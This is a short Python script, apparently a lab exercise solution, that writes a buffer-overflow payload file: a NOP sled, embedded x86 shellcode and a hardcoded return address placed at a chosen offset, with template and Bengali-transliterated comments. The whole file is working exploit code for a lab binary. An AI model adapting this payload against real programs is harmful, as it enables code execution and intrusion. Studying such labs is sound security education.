#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x31\xc9\x31\xc0\xb0\x15\x50\xbb\xd1\x62\x55\x56\xff\xd3\x50\xff"
   "\xd3\x50\xff\xd3\x50\xff\xd3\x50\xff\xd3"
).encode('latin-1')



# Fill the content with NOP's

K = 2116
content = bytearray(0x90 for i in range(K)) 

##################################################################
# Put the shellcode somewhere in the payload
start =   K - len(shellcode)              # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

ret    = 0xffffcd88   + 0x482   # Change this number [ ekahne ebp er addr ] [ ar bar er addr assembly file e]
offset = 807 + L              	# Change this number 

content[offset : offset + L] = (ret).to_bytes(L,byteorder='little') 
"""
for i in range(0, 224, L):
	content[i:i+L] = (ret).to_bytes(L,byteorder='little')
"""
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

